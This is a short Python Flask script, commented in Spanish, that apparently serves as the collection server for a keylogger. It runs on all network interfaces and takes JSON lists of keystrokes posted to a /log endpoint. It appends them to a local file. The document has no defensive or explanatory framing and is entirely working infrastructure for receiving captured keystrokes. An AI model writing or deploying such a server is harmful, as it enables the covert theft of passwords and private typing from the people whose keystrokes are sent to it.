from flask import Flask, request, jsonify

app = Flask(__name__)

# Endpoint para recibir keystrokes
@app.route('/log', methods=['POST'])
def log_keystrokes():
    data = request.json
    keystrokes = data.get('keystrokes', [])
    with open('keystrokes.log', 'a') as f:
        f.write(''.join(keystrokes) + '\n')
    return jsonify({'status': 'success'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)